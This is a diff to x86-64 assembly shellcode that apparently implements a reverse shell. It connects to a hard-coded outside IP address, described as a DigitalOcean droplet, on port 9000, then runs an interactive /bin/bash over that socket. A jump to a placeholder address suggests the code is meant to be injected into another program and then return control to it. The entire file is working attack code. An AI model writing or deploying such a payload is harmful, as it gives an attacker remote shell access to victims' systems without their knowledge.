@@ -1,5 +1,12 @@
 [bits 64]
 
+%ifndef IPADDR
+    %define IPADDR 0xB7_D0_D1_86 ; 134.209.208.183 (digital ocean droplet)
+%endif
+%ifndef PORT
+    %define PORT 0x2823 ; 9000
+%endif
+
 global _start
 
 _start:
@@ -40,21 +47,11 @@ _start:
     sub rsp, 16 ; reserve 16 bytes for sockaddr_in
     mov word [rsp], 2 ; 2 bytes for AF_INET
     ; the hex below is written in little endian for 0x86 hex which is read as big endian
-    mov word [rsp+2], 0x2823 ; 2 bytes for port
-    mov dword [rsp+4], 0xB7_D0_D1_86 ; 4 bytes for ip addr
+    mov word [rsp+2], PORT ; 2 bytes for port
+    mov dword [rsp+4], IPADDR ; 4 bytes for ip addr
     ; 8 bytes after is padding
     mov rsi, rsp ; sockaddr_in = stack
     mov rdx, 16 ; socklen = 16
-    syscall
-
-    ; execve("/bin/sh", ["/bin/sh", null], null)
-    xor rax, rax
-    push rax ; argv[1] = null
-    lea rdi, [rel path]
-    push rdi ; argv[0] = "/bin/sh"
-    mov rsi, rsp
-    xor rdx, rdx
-    mov rax, 59 ; sys_execve = 59
     syscall
 
     ; execve("/bin/bash", ["/bin/bash", "-i", null], null)
@@ -67,23 +64,19 @@ _start:
     mov rsi, rsp
     xor rdx, rdx
     mov rax, 59 ; sys_execve = 59
+    syscall
+
+    ; if execve failed exit
+    mov rax, 60
+    xor rdi, rdi
+    syscall
  
 original:
-    ; sys_write
-    mov rax, 1
-    mov rdi, 1
-    lea rsi, [rel text]
-    mov rdx, 25
-    syscall
-    
     mov rax, 0xDEADBEEFDEADBEEF
     jmp rax
 
-text:
-    db "is it dead beef or steak", 0x0A
-
 path:
-    db "/bin/sh", 0
+    db "/bin/bash", 0
 
 flag:
     db "-i", 0
